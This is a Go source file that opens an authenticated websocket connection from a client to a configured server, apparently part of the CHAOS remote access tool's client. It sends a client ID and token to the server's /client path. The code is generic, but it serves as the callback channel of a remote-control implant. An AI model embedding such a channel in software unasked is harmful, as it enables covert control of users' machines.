package websocket

import (
	"fmt"
	"github.com/gorilla/websocket"
	"github.com/tiagorlampert/CHAOS/client/app/environment"
	"net/http"
	"net/url"
)

func NewConnection(configuration *environment.Configuration, clientID string) (*websocket.Conn, error) {
	host := configuration.Server.Address
	if configuration.Server.HttpPort != "" {
		host = fmt.Sprint(host, ":", configuration.Server.HttpPort)
	}

	u := url.URL{Scheme: "ws", Host: host, Path: "/client"}

	header := http.Header{}
	header.Set("x-client", clientID)
	header.Set("Cookie", configuration.Connection.Token)

	conn, _, err := websocket.DefaultDialer.Dial(u.String(), header)
	return conn, err
}
